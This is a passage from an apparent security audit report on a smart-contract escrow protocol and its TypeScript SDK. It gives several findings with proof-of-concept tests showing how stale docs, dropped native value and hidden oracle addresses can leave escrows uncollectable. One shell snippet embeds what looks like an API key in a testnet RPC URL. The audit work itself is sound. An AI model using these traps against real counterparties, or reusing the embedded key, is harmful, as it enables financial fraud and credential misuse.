    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
    return decisions[demand_.oracle][decisionKey];
}
```

##### trustedOracle.ts

Path: `sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 316

```typescript
arbitrate: async (fulfillmentUid, demand, decision) => {
  const hash = await viemClient.writeContract({
    address: addresses.trustedOracleArbiter,
    abi: trustedOracleArbiterAbi.abi,
    functionName: "arbitrate",
    args: [fulfillmentUid, demand, decision],
  });
  return hash;
},
```

##### trustedOracle.ts

Path: `sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 280

```typescript
const innerData = demand && demand !== "0x" ? decodeDemand(demand).data : "0x";
const hash = await arbitrateOnchain(attestation.uid, innerData, decisionResult);
```

#### Proof of Concept

Run the focused integration test in `sdks/ts`:

1. `cd sdks/ts`
2. `bun test tests/integration/POC_offchain-oracle-manual-arbitration_228ec670.test.ts --timeout 120000`

The test reproduces a successful manual arbitration with outer demand, a positive `waitForArbitration()`, a reverting `collect()`, and a successful reclaim after expiry.

##### Change into SDK package

Path: `sdks/ts`

```bash
cd sdks/ts
```

##### Run focused PoC test

Path: `sdks/ts`

```bash
bun test tests/integration/POC_offchain-oracle-manual-arbitration_228ec670.test.ts --timeout 120000
```

##### POC_offchain-oracle-manual-arbitration_228ec670.test.ts

Path: `sdks/ts/tests/integration/POC_offchain-oracle-manual-arbitration_228ec670.test.ts`

```typescript
import { afterEach, beforeEach, expect, test } from "bun:test";
import { encodeAbiParameters, parseAbiParameters, parseEther } from "viem";
import { abi as trustedOracleArbiterAbi } from "../../src/contracts/arbiters/TrustedOracleArbiter";
import { setupTestEnvironment, type TestContext } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

const oracleDemandAbi = parseAbiParameters("(string mockDemand)");

let testContext: TestContext;

beforeEach(async () => {
  testContext = await setupTestEnvironment();
});

afterEach(async () => {
  await teardownTestEnvironment(testContext);
});

/**
 * @title POC: TrustedOracle manual arbitration with outer demand strands settlement
 * @notice Proof Statement: Proves that calling the shipped manual `trustedOracle.arbitrate()`
 * helper with the exact outer bytes returned by `encodeDemand()` produces a successful
 * arbitration transaction, but `TrustedOracleArbiter.check()` still returns false, so
 * `collect()` reverts and an expiring escrow can be reclaimed by the escrower.
 *
 * Bug Vector:
 * 1. Alice creates an expiring ERC20 default escrow with `TrustedOracleArbiter`.
 * 2. Bob fulfills the work and requests arbitration using the outer encoded demand.
 * 3. Charlie follows the documented manual flow and calls `arbitrate(fulfillmentUid, demand, true)`.
 * 4. The transaction succeeds, but `check()` still fails because it hashes the inner `demand.data`.
 * 5. Bob cannot collect and Alice reclaims after expiry.
 */
test("manual trusted-oracle arbitration with outer demand blocks collect and enables reclaim", async () => {
  const innerDemand = encodeAbiParameters(oracleDemandAbi, [{ mockDemand: "foo" }]);
  const demand = testContext.alice.client.arbiters.general.trustedOracle.encodeDemand({
    oracle: testContext.charlie.address,
    data: innerDemand,
  });

  const escrowAmount = parseEther("100");
  const token = {
    address: testContext.mockAddresses.erc20A,
    value: escrowAmount,
  };

  const aliceBalanceBefore = await testContext.testClient.getErc20Balance(
    { address: token.address },
    testContext.alice.address,
  );
  const bobBalanceBefore = await testContext.testClient.getErc20Balance(
    { address: token.address },
    testContext.bob.address,
  );

  const latestBlock = await testContext.testClient.getBlock();
  const expirationTime = latestBlock.timestamp + 60n;

  const { attested: escrow } = await testContext.alice.client.erc20.escrow.default.permitAndCreate(
    token,
    {
      arbiter: testContext.addresses.trustedOracleArbiter,
      demand,
    },
    expirationTime,
  );

  const aliceBalanceAfterCreate = await testContext.testClient.getErc20Balance(
    { address: token.address },
    testContext.alice.address,
  );

  expect(aliceBalanceAfterCreate).toBe(aliceBalanceBefore - escrowAmount);

  const { attested: fulfillment } = await testContext.bob.client.stringObligation.doObligation(
    "foo",
    undefined,
    escrow.uid,
  );

  const requestHash = await testContext.bob.client.arbiters.general.trustedOracle.requestArbitration(
    fulfillment.uid,
    testContext.charlie.address,
    demand,
  );
  await testContext.bob.client.viemClient.waitForTransactionReceipt({ hash: requestHash });

  const arbitrateHash = await testContext.charlie.client.arbiters.general.trustedOracle.arbitrate(
    fulfillment.uid,
    demand,
    true,
  );
  await testContext.charlie.client.viemClient.waitForTransactionReceipt({ hash: arbitrateHash });

  const arbitrationEvent = await testContext.charlie.client.arbiters.general.trustedOracle.waitForArbitration(
    fulfillment.uid,
    testContext.charlie.address,
  );
  expect(arbitrationEvent.decision).toBe(true);

  const fulfillmentAttestation = await testContext.charlie.client.getAttestation(fulfillment.uid);
  const arbitrationCheck = await testContext.testClient.readContract({
    address: testContext.addresses.trustedOracleArbiter,
    abi: trustedOracleArbiterAbi.abi,
    functionName: "check",
    args: [fulfillmentAttestation, demand, escrow.uid],
  });

  expect(arbitrationCheck).toBe(false);

  const failedCollection = testContext.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid);
  await expect(failedCollection).rejects.toThrow();

  await testContext.testClient.increaseTime({ seconds: 61 });
  await testContext.testClient.mine({ blocks: 1 });

  const reclaimHash = await testContext.alice.client.erc20.escrow.default.reclaim(escrow.uid);
  await testContext.alice.client.viemClient.waitForTransactionReceipt({ hash: reclaimHash });

  const aliceBalanceAfterReclaim = await testContext.testClient.getErc20Balance(
    { address: token.address },
    testContext.alice.address,
  );
  const bobBalanceAfterReclaim = await testContext.testClient.getErc20Balance(
    { address: token.address },
    testContext.bob.address,
  );

  expect(aliceBalanceAfterReclaim).toBe(aliceBalanceBefore);
  expect(bobBalanceAfterReclaim).toBe(bobBalanceBefore);
});
```

#### Recommendation

The safest fix is to make the public helper preserve the same semantics as `check()` and `arbitrateMany()`: accept the outer `TrustedOracleArbiter.DemandData` bytes at the API boundary, decode them, and submit only the inner `data` bytes on-chain.

```typescript
arbitrate: async (fulfillmentUid, demand, decision) => {
  const innerData = demand && demand !== "0x" ? decodeDemand(demand).data : "0x";
  return await viemClient.writeContract({
    address: addresses.trustedOracleArbiter,
    abi: trustedOracleArbiterAbi.abi,
    functionName: "arbitrate",
    args: [fulfillmentUid, innerData, decision],
  });
}
```

Also update every README / website example to pass either the outer bytes to a fixed helper or the inner bytes explicitly, and add a regression test that uses the documented manual-arbitration example end-to-end.

#### Assumptions

- [x] The oracle or integrator follows the shipped README / docs / helper naming instead of reading the `TrustedOracleArbiter` source.
- [x] The escrow has a nonzero expiration, or the parties eventually abandon the flow after repeated failed collection attempts.
- [x] The fulfiller cannot independently force the oracle to resubmit the decision with the correct inner bytes before expiry.

#### Predicted Invalid Reasons

- `arbitrate()` is supposed to take the inner payload only; advanced users should know to pass `demand.data`.

<a id="finding-alka-23"></a>
### ALKA-23 — Commit-reveal docs still prescribe empty demand bytes and a stale Base Sepolia deployment, enabling free-work traps

#### Summary

Repo docs still tell users to compose `CommitRevealObligation` with empty `"0x"` demand bytes and a stale Base Sepolia address, while the current contract and SDK require `encodeDemand({ bondAmount, commitDeadline })`. That mismatch can mislead users into creating an escrow that looks valid in the docs but cannot settle once `check()` decodes the empty demand.

#### Context Files

##### Empty-demand commit-reveal example

Path: `docs/skills/alkahest-user/references/arbiters.md`
Highlight lines: 1

```typescript
const demand = client.arbiters.logical.all.encodeDemand({
  arbiters: [
    client.contractAddresses.commitRevealObligation,
    client.contractAddresses.trustedOracleArbiter,
  ],
  demands: [
    "0x",
    client.arbiters.general.trustedOracle.encodeDemand({ oracle: ORACLE, data: "0x" }),
  ],
});
```

##### CommitRevealObligation check()

Path: `contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 1

```solidity
function commit(bytes32 commitment, uint256 commitDeadline) external payable { ... }

function check(Attestation memory obligation, bytes memory demand, bytes32)
  public view override returns (bool)
{
    DemandData memory demandData = abi.decode(demand, (DemandData));
    if (info.commitDeadline != demandData.commitDeadline) return false;
    return info.bondAmount == demandData.bondAmount;
}
```

##### CommitReveal SDK helpers

Path: `sdks/ts/src/clients/obligations/commitReveal/index.ts`
Highlight lines: 1

```typescript
encodeDemand: (data: { bondAmount: bigint; commitDeadline: bigint }) => ...
commit: async (commitment, bondAmount, commitDeadline) => {
  functionName: "commit",
  args: [commitment, commitDeadline],
  value: bondAmount,
}
```

#### Proof of Concept

Run the focused Foundry PoC from `contracts/` to reproduce the stale `"0x"` commit-reveal child-demand flow. The test shows the seller can commit, reveal, and get oracle approval, yet `collect()` still reverts; after expiry, the buyer reclaims the escrow. The optional Base Sepolia check confirms the old docs address is a different deployment from the current SDK address.

##### Foundry PoC

Path: `test/unit/obligations/POC_CommitRevealObligation_a005f8d2.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {AllArbiter} from "@src/arbiters/logical/AllArbiter.sol";
import {TrustedOracleArbiter} from "@src/arbiters/TrustedOracleArbiter.sol";
import {CommitRevealObligation} from "@src/obligations/CommitRevealObligation.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

/**
 * @title POC: Stale Empty Commit-Reveal Demand Creates Uncollectable Escrow
 * @notice Proof Statement: Proves that the documented `AllArbiter` composition using an empty `0x`
 * child demand for `CommitRevealObligation` creates an escrow that the seller cannot collect even
 * after a valid commit, valid reveal, and oracle approval. After expiry, the buyer reclaims the
 * escrowed funds. The same fulfillment would satisfy the current contract semantics if the escrow
 * had carried encoded `DemandData`.
 */
contract POC_CommitRevealObligation_a005f8d2 is Test {
    CommitRevealObligation internal commitReveal;
    NativeTokenEscrowObligation internal nativeEscrow;
    TrustedOracleArbiter internal trustedOracle;
    AllArbiter internal allArbiter;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;

    address internal buyer;
    address internal seller;
    address internal oracle;

    uint256 internal constant PAYMENT = 1 ether;
    uint256 internal constant BOND = 0.1 ether;
    uint256 internal constant COMMIT_DEADLINE = 1 hours;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        buyer = makeAddr("buyer");
        seller = makeAddr("seller");
        oracle = makeAddr("oracle");

        commitReveal = new CommitRevealObligation(eas, schemaRegistry, makeAddr("treasury"));
        nativeEscrow = new NativeTokenEscrowObligation(eas, schemaRegistry);
        trustedOracle = new TrustedOracleArbiter(eas);
        allArbiter = new AllArbiter();
    }

    function _revealData() internal pure returns (CommitRevealObligation.ObligationData memory) {
        return CommitRevealObligation.ObligationData({
            payload: abi.encode("completed deliverable"), salt: bytes32("seller-salt"), schema: bytes32("string")
        });
    }

    function _composeDemand(bytes memory commitRevealDemand, bytes memory oracleDemand)
        internal
        view
        returns (bytes memory)
    {
        address[] memory arbiters = new address[](2);
        arbiters[0] = address(commitReveal);
        arbiters[1] = address(trustedOracle);

        bytes[] memory demands = new bytes[](2);
        demands[0] = commitRevealDemand;
        demands[1] = oracleDemand;

        return abi.encode(AllArbiter.DemandData({arbiters: arbiters, demands: demands}));
    }

    function test_documentedEmptyDemandLocksSettlementButBuyerCanReclaim() public {
        bytes memory oracleInnerDemand = abi.encode("accept deliverable");
        bytes memory oracleDemand =
            abi.encode(TrustedOracleArbiter.DemandData({oracle: oracle, data: oracleInnerDemand}));
        bytes memory staleDemand = _composeDemand(bytes(""), oracleDemand);

        vm.deal(buyer, PAYMENT);
        vm.prank(buyer);
        bytes32 escrowUid = nativeEscrow.doObligation{value: PAYMENT}(
            NativeTokenEscrowObligation.ObligationData({
                arbiter: address(allArbiter),
                demand: staleDemand,
                amount: PAYMENT
            }),
            uint64(block.timestamp + 1 days)
        );

        CommitRevealObligation.ObligationData memory revealData = _revealData();
        bytes32 commitment = commitReveal.computeCommitment(escrowUid, seller, revealData);

        vm.deal(seller, BOND);
        vm.prank(seller);
        commitReveal.commit{value: BOND}(commitment, COMMIT_DEADLINE);

        vm.roll(block.number + 1);

        uint256 sellerBalanceBeforeReveal = seller.balance;
        vm.prank(seller);
        bytes32 fulfillmentUid = commitReveal.doObligation(revealData, escrowUid);
        assertEq(seller.balance, sellerBalanceBeforeReveal + BOND, "seller receives bond refund after reveal");

        Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
        vm.prank(oracle);
        trustedOracle.arbitrate(fulfillmentUid, oracleInnerDemand, true);

        bytes memory correctCommitRevealDemand =
            abi.encode(CommitRevealObligation.DemandData({bondAmount: BOND, commitDeadline: COMMIT_DEADLINE}));
        bytes memory correctDemand = _composeDemand(correctCommitRevealDemand, oracleDemand);

        assertTrue(trustedOracle.check(fulfillment, oracleDemand, escrowUid), "oracle approved fulfillment");
        assertTrue(commitReveal.check(fulfillment, correctCommitRevealDemand, escrowUid), "reveal satisfies current demand");
        assertTrue(allArbiter.check(fulfillment, correctDemand, escrowUid), "all arbiter would accept current demand");

        vm.prank(seller);
        vm.expectRevert();
        nativeEscrow.collect(escrowUid, fulfillmentUid);

        assertEq(address(nativeEscrow).balance, PAYMENT, "escrow still holds payment after failed collect");

        vm.warp(block.timestamp + 1 days + 1);

        uint256 buyerBalanceBeforeReclaim = buyer.balance;
        vm.prank(buyer);
        bool reclaimed = nativeEscrow.reclaim(escrowUid);

        assertTrue(reclaimed, "buyer reclaims after expiry");
        assertEq(buyer.balance, buyerBalanceBeforeReclaim + PAYMENT, "buyer recovers escrowed funds");
        assertEq(address(nativeEscrow).balance, 0, "escrow emptied on reclaim");
    }
}
```

##### Base Sepolia sanity check

Path: ``

```bash
RPC="https://base-sepolia.g.alchemy.com/v2/sVPBhciVXJ-lqvcfOpGzw"
OLD="0x447b11ce03237f0C674eF7F16c913c3B2e8ef494"
NEW="0x14d0B7D4ed6915CE0b1a0d54F9D5912584dB550E"
DATA=$(cast abi-encode "f(uint256,uint256)" 100 3600)
cast call "$OLD" "bondAmount()(uint256)" --rpc-url "$RPC"
cast call "$NEW" "decodeDemandData(bytes)((uint256,uint256))" "$DATA" --rpc-url "$RPC"
cast call "$OLD" "decodeDemandData(bytes)((uint256,uint256))" "$DATA" --rpc-url "$RPC"
```

#### Recommendation

Remove every empty-demand commit-reveal example and make the docs use the SDK’s `encodeDemand({ bondAmount, commitDeadline })` helper.

```text
- Replace all `"0x"` commit-reveal demand examples with encoded DemandData.
- Add a docs regression check that rejects stale commit-reveal examples.
- Sync the Base Sepolia contract table to the June 24, 2026 deployment.
- Add an SDK guard that rejects `CommitRevealObligation` demands equal to `0x`.
```

Fix checklist:

- [ ] Replace every `"0x"` commit-reveal demand example with `encodeDemand({ bondAmount, commitDeadline })`.
- [ ] Update the Base Sepolia contract tables to the current `CommitRevealObligation` deployment.
- [ ] Regenerate `contracts/deployments/deployment_base_sepolia.json` from the same source of truth as the SDK address map.
- [ ] Add a docs regression check that rejects stale commit-reveal examples.
- [ ] Add SDK validation that rejects `CommitRevealObligation` demands equal to `0x`.

#### Assumptions

- [x] The seller relies on the repo’s documentation when validating the buyer’s `CommitRevealObligation` demand.
- [x] The escrow becomes reclaimable by the buyer after expiry.
- [x] The buyer only needs to choose the documented-but-invalid `0x` demand bytes.
- [x] The seller does not independently reconstruct the current SDK demand format from the contract.

#### Predicted Invalid Reasons

- This is stale documentation, not a protocol vulnerability.
- The demand is visible.
- The current SDK/CLI already use the correct contract and ABI.
- Counterparties can reject malformed demands.

<a id="finding-alka-12"></a>
### ALKA-12 — Stale Base Sepolia address metadata still points default users to an ExpirationTimeBefore arbiter that accepts non-expiring fulfillments

#### Summary

Base Sepolia discovery metadata still publishes the obsolete `ExpirationTimeBeforeArbiter` address in the static manifest, contract-reference tables, and MCP parser, while the maintained SDK/CLI defaults use the redeployed address. Consumers that trust the stale discovery surfaces can still be steered to a legacy arbiter whose old interface accepted `expirationTime == 0` fulfillments for finite deadlines.

#### Context Files

##### parse-deployments.ts

Path: `docs/mcp-server/scripts/parse-deployments.ts`
Highlight lines: 1, 6

```typescript
const CHAIN_INFO = {
  deployment_base_sepolia: { chainName: "Base Sepolia", chainId: 84532 },
  deployment_monad: { chainName: "Monad Testnet", chainId: 143 },
};

if (/deployment_\d+/.test(fileName)) {
  return null;
}
```

##### deployment_base_sepolia.json

Path: `contracts/deployments/deployment_base_sepolia.json`
Highlight lines: 1

```json
"expirationTimeBeforeArbiter": "0x698008cC7F4714D331Aa27278BfE6B74FA925cF7"
```

##### config.ts

Path: `sdks/ts/src/config.ts`
Highlight lines: 1

```typescript
expirationTimeBeforeArbiter: "0xcae48f46d89cd2d78118a84d8CA589Ee7d29C98c",
```

##### ExpirationTimeBeforeArbiter.sol

Path: `contracts/src/arbiters/attestation-properties/ExpirationTimeBeforeArbiter.sol`
Highlight lines: 1

```solidity
if (fulfillment.expirationTime > demand_.expirationTime) {
    revert ExpirationTimeNotBefore();
}
```

#### Proof of Concept

The stale Base Sepolia metadata still resolves `ExpirationTimeBeforeArbiter` to `0x698008cC7F4714D331Aa27278BfE6B74FA925cF7` in the static manifest and MCP path, while the maintained SDK default uses `0xcae48f46d89cd2d78118a84d8CA589Ee7d29C98c`.

A consumer that follows the stale discovery surfaces can be routed to the legacy arbiter, whose old `checkObligation(...)` logic accepted `expirationTime == 0` fulfillments for finite deadlines.

##### parse-deployments.ts

Path: `docs/mcp-server/scripts/parse-deployments.ts`

```typescript
const CHAIN_INFO = {
  deployment_base_sepolia: { chainName: "Base Sepolia", chainId: 84532 },
  deployment_monad: { chainName: "Monad Testnet", chainId: 143 },
};

if (/deployment_\d+/.test(fileName)) {
  return null;
}
```

##### deployment_base_sepolia.json

Path: `contracts/deployments/deployment_base_sepolia.json`

```json
"expirationTimeBeforeArbiter": "0x698008cC7F4714D331Aa27278BfE6B74FA925cF7"
```

##### config.ts

Path: `sdks/ts/src/config.ts`

```typescript
expirationTimeBeforeArbiter: "0xcae48f46d89cd2d78118a84d8CA589Ee7d29C98c",
```

##### ExpirationTimeBeforeArbiter.sol (pre-fix)

Path: `contracts/src/arbiters/attestation-properties/ExpirationTimeBeforeArbiter.sol`

```solidity
if (fulfillment.expirationTime > demand_.expirationTime) {
    revert ExpirationTimeNotBefore();
}
```

##### ExpirationTimeBeforeArbiter.sol (fixed)

Path: `contracts/src/arbiters/attestation-properties/ExpirationTimeBeforeArbiter.sol`

```solidity
if (fulfillment.expirationTime == 0 || fulfillment.expirationTime > demand_.expirationTime) {
    revert ExpirationTimeNotBefore();
}
```

#### Recommendation

Regenerate all published Base Sepolia address sources from the same post-redeploy manifest and add a synchronization guard.

```text
- Update the static Base Sepolia deployment JSON after each redeploy.
- Generate the docs contract tables from the same canonical source as the SDK config.
- Teach `alkahest-mcp` to read current per-chain deployment outputs instead of dropping timestamped artifacts.
- Add a CI assertion that no published address for Base Sepolia can differ from the canonical map.
```

Fix checklist:

- [ ] Regenerate `contracts/deployments/deployment_base_sepolia.json` from the canonical post-redeploy deployment source.
- [ ] Regenerate both contract-reference tables from the same canonical Base Sepolia address map used by the SDKs.
- [ ] Make `docs/mcp-server/scripts/parse-deployments.ts` consume the same canonical address map used by the SDK defaults.
- [ ] Add a CI assertion that Base Sepolia addresses match across SDK defaults, static manifests, docs, and MCP output.

#### Assumptions

- [x] The obsolete Base Sepolia arbiter remains live at the published address.
- [x] Downstream consumers resolve Base Sepolia contract addresses from the repo’s published discovery surfaces.
- [x] The escrow uses `ExpirationTimeBeforeArbiter` directly or inside a composition to enforce finite-lifetime fulfillments.

#### Predicted Invalid Reasons

- This is just stale documentation; the real SDK defaults are already fixed.

<a id="finding-alka-21"></a>
### ALKA-21 — Shipped TypeScript bundle clients cannot represent or forward native value, breaking every mixed-native bundle flow

#### Summary

The shipped TypeScript high-level `TokenBundle` API cannot represent or forward native ETH: `flattenTokenBundle` hard-codes `nativeAmount: 0n`, and the bundle payment, escrow, and `payBundleAndCollect` helpers never attach `value`. Mixed-native bundle flows therefore fail through the documented helper path, even though lower-level raw encoders still support `nativeAmount`.

#### Context Files

##### TokenBundle type

Path: `sdks/ts/src/types.ts`
Highlight lines: 1

```typescript
export type TokenBundle = {
  erc20s: Erc20[];
  erc721s: Erc721[];
  erc1155s: Erc1155[];
};
```

##### flattenTokenBundle helper

Path: `sdks/ts/src/utils/index.ts`
Highlight lines: 1

```typescript
export const flattenTokenBundle = (bundle: TokenBundle): TokenBundleFlat => ({
  nativeAmount: 0n,
  erc20Tokens: bundle.erc20s.map((x) => x.address),
  erc20Amounts: bundle.erc20s.map((x) => x.value),
  erc721Tokens: bundle.erc721s.map((x) => x.address),
  erc721TokenIds: bundle.erc721s.map((x) => x.id),
  erc1155Tokens: bundle.erc1155s.map((x) => x.address),
  erc1155TokenIds: bundle.erc1155s.map((x) => x.id),
  erc1155Amounts: bundle.erc1155s.map((x) => x.value),
});
```

##### Token bundle helpers

Path: `sdks/ts/src/clients/obligations/tokenBundle/payment.ts`
Highlight lines: 1

```typescript
// payment
writeContract({
  address: addresses.paymentObligation,
  functionName: "doObligation",
  args: [{ ...flattenTokenBundle(price), payee }, refUID],
})

// escrow create
writeContract({
  address: addresses.escrowObligation,
  functionName: "doObligation",
  args: [{ ...flattenTokenBundle(price), ...item }, expiration],
})

// atomic settle
writeContract({
  address: addresses.atomicPaymentUtils,
  functionName: "payBundleAndCollect",
  args: [escrowUid],
})
```

##### TokenBundlePaymentObligation native funding check

Path: `contracts/src/obligations/payment/TokenBundlePaymentObligation.sol`
Highlight lines: 1

```solidity
if (obligationData.nativeAmount > 0) {
    if (msg.value < obligationData.nativeAmount) {
        revert InsufficientPayment(obligationData.nativeAmount, msg.value);
    }
    (bool success,) = payable(obligationData.payee).call{value: obligationData.nativeAmount}("");
    if (!success) revert NativeTokenTransferFailed(obligationData.payee, obligationData.nativeAmount);
}
```

##### AtomicPaymentUtils native equality check

Path: `contracts/src/utils/atomic/AtomicPaymentUtils.sol`
Highlight lines: 1

```solidity
if (msg.value != data.nativeAmount) revert IncorrectNativeAmount(data.nativeAmount, msg.value);
```

#### Proof of Concept

Run `bun test tests/integration/POC_tokenBundleNativeHelpers_a1485497.test.ts --timeout 120000` from `sdks/ts`. The PoC shows the high-level bundle encoder decodes back with `nativeAmount = 0`, the hard-coded `payBundleAndCollect` request reverts for a mixed native/ERC20 escrow with `IncorrectNativeAmount`, and the same escrow succeeds when the caller attaches the required ETH through a raw contract call.

##### POC: bundle helpers omit native value

Path: `sdks/ts/tests/integration/POC_tokenBundleNativeHelpers_a1485497.test.ts`

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { parseEther } from "viem";
import { abi as atomicPaymentUtilsAbi } from "../../src/contracts/utils/AtomicPaymentUtils";
import { setupTestEnvironment, type TestContext } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

/**
 * @title POC: High-level bundle helpers drop native legs and cannot settle mixed-native bundle escrows
 * @notice Proof Statement: Prove that the shipped TypeScript bundle helpers cannot carry a native leg through their
 * high-level `TokenBundle` surface: `encodeObligation` silently encodes `nativeAmount = 0`, and
 * the exact no-value `payBundleAndCollect` request hard-coded by the shipped helper reverts against a real mixed
 * native/ERC20 bundle escrow because it never sends `msg.value`. The same escrow settles successfully through a direct
 * raw contract call with the required ETH, proving the failure is in the shipped helper layer rather than the
 * underlying contracts.
 */
describe("POC: bundle helpers omit native value", () => {
  let testContext: TestContext;

  beforeEach(async () => {
    testContext = await setupTestEnvironment();
  });

  afterEach(async () => {
    await teardownTestEnvironment(testContext);
  });

  test("mixed native/ERC20 bundle demand breaks through the high-level helper but succeeds with a raw call", async () => {
    const aliceClient = testContext.alice.client;
    const bobClient = testContext.bob.client;
    const alice = testContext.alice.address;
    const bob = testContext.bob.address;
    const demandedNativeAmount = parseEther("1");
    const demandedErc20Amount = parseEther("5");
    const escrowedErc20Amount = parseEther("10");

    const mixedBundle = {
      erc20s: [{ address: testContext.mockAddresses.erc20B, value: demandedErc20Amount }],
      erc721s: [],
      erc1155s: [],
    };

    const highLevelEncoding = aliceClient.bundle.payment.decodeObligation(
      aliceClient.bundle.payment.encodeObligation(
        {
          nativeAmount: demandedNativeAmount,
          ...mixedBundle,
        } as any,
        alice,
      ),
    );
    expect(highLevelEncoding.nativeAmount).toBe(0n);
    expect(highLevelEncoding.erc20Amounts).toEqual([demandedErc20Amount]);

    const rawBundleDemand = aliceClient.bundle.payment.encodeObligationRaw({
      nativeAmount: demandedNativeAmount,
      erc20Tokens: [testContext.mockAddresses.erc20B],
      erc20Amounts: [demandedErc20Amount],
      erc721Tokens: [],
      erc721TokenIds: [],
      erc1155Tokens: [],
      erc1155TokenIds: [],
      erc1155Amounts: [],
      payee: alice,
    });
    const rawEncoding = aliceClient.bundle.payment.decodeObligation(rawBundleDemand);
    expect(rawEncoding.nativeAmount).toBe(demandedNativeAmount);
    expect(rawEncoding.erc20Amounts).toEqual([demandedErc20Amount]);

    const { attested: escrow } = await aliceClient.erc20.escrow.default.approveAndCreate(
      { address: testContext.mockAddresses.erc20A, value: escrowedErc20Amount },
      {
        arbiter: testContext.addresses.tokenBundlePaymentObligation,
        demand: rawBundleDemand,
      },
      0n,
    );

    await bobClient.bundle.util.approve(mixedBundle, "atomicPayment");

    let helperError: unknown;
    try {
      await bobClient.viemClient.simulateContract({
        address: bobClient.bundle.payment.atomicPaymentUtilsAddress,
        abi: atomicPaymentUtilsAbi.abi,
        functionName: "payBundleAndCollect",
        args: [escrow.uid],
      });
    } catch (error) {
      helperError = error;
    }

    expect(helperError).toBeDefined();
    expect(String(helperError)).toMatch(/IncorrectNativeAmount|revert|value/i);

    const aliceNativeBefore = await testContext.testClient.getBalance({ address: alice });
    const aliceDemandTokenBefore = await testContext.testClient.getErc20Balance(
      { address: testContext.mockAddresses.erc20B },
      alice,
    );
    const bobEscrowTokenBefore = await testContext.testClient.getErc20Balance(
      { address: testContext.mockAddresses.erc20A },
      bob,
    );

    const hash = await bobClient.viemClient.writeContract({
      address: testContext.addresses.tokenBundleAtomicPaymentUtils,
      abi: atomicPaymentUtilsAbi.abi,
      functionName: "payBundleAndCollect",
      args: [escrow.uid],
      value: demandedNativeAmount,
      chain: bobClient.viemClient.chain,
    });
    const receipt = await testContext.testClient.waitForTransactionReceipt({ hash });
    expect(receipt.status).toBe("success");

    const aliceNativeAfter = await testContext.testClient.getBalance({ address: alice });
    const aliceDemandTokenAfter = await testContext.testClient.getErc20Balance(
      { address: testContext.mockAddresses.erc20B },
      alice,
    );
    const bobEscrowTokenAfter = await testContext.testClient.getErc20Balance(
      { address: testContext.mockAddresses.erc20A },
      bob,
    );

    expect(aliceNativeAfter - aliceNativeBefore).toBe(demandedNativeAmount);
    expect(aliceDemandTokenAfter - aliceDemandTokenBefore).toBe(demandedErc20Amount);
    expect(bobEscrowTokenAfter - bobEscrowTokenBefore).toBe(escrowedErc20Amount);
  });
});
```

#### Recommendation

Add first-class native bundle support to the SDK instead of dropping it from the high-level type.

Primary fix:
- extend `TokenBundle` to include a native field;
- propagate that field through `flattenTokenBundle`;
- attach `value: nativeAmount` on bundle payment / escrow creation / `payBundleAndCollect` calls.

Example direction:

```typescript
export type TokenBundle = {
  nativeAmount: bigint;
  erc20s: Erc20[];
  erc721s: Erc721[];
  erc1155s: Erc1155[];
};
```

```typescript
writeContract({
  address: addresses.atomicPaymentUtils,
  functionName: "payBundleAndCollect",
  args: [escrowUid],
  value: demand.nativeAmount,
})
```

Fix checklist:

- [ ] Extend `TokenBundle` with `nativeAmount`.
- [ ] Preserve `nativeAmount` in `flattenTokenBundle(...)`.
- [ ] Forward `value: nativeAmount` in bundle payment, escrow creation, and `payBundleAndCollect` calls.
- [ ] Add integration tests for mixed native + token bundle create, pay, and atomic settlement flows through the high-level helper API.

#### Assumptions

- [x] The documented high-level `TokenBundle` helpers are the intended integration path for mixed-native bundle flows.
- [x] Mixed native/token bundles are intended to remain supported by the TypeScript SDK surface.

#### Predicted Invalid Reasons

- “The high-level helper is incomplete, but the SDK already exports raw encoders and ABIs for advanced flows, so this is not a high-severity protocol issue.”

<a id="finding-alka-3"></a>
### ALKA-3 — extractDemandData/getEscrowAndDemand hide the TrustedOracle authorizer from counterparties

#### Summary

The TypeScript helpers `extractDemandData()` and `getEscrowAndDemand()` unwrap `TrustedOracleArbiter` and return only the inner `data`, hiding the `oracle` address that actually authorizes settlement. Counterparties who rely on these helpers can miss the real payout authority and act on a misleading escrow preview.

#### Context Files

##### extractDemandData helper

Path: `sdks/ts/src/index.ts`
Highlight lines: 2, 5, 6

```typescript
const demandAbi = parseAbiParameters("(address oracle, bytes data)");
const demand = client.extractDemandData(demandAbi, escrowAttestation);

const trustedOracleDemandAbi = parseAbiParameters("(address oracle, bytes data)");
const trustedOracleDemand = decodeAbiParameters(trustedOracleDemandAbi, arbiterDemand.demand)[0];

return decodeAbiParameters(demandAbi, trustedOracleDemand.data);
```

##### TrustedOracleArbiter demand struct

Path: `contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 1, 2, 3

```solidity
struct DemandData {
    address oracle;
    bytes data;
}
```

##### TrustedOracleArbiter settlement check

Path: `contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 6, 7, 8

```solidity
function check(Attestation memory fulfillment, bytes memory demand, bytes32)
    public
    view
    override
    returns (bool)
{
    DemandData memory demand_ = abi.decode(demand, (DemandData));
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
    return decisions[demand_.oracle][decisionKey];
}
```

#### Proof of Concept

The Bun PoC creates a `TrustedOracleArbiter` escrow, shows `extractDemandData()` / `getEscrowAndDemand()` returning only the inner payment payload, and confirms `decodeDemand()` reveals the hidden `oracle`. The victim then pays, `collect()` reverts, and the escrow creator reclaims after expiry.

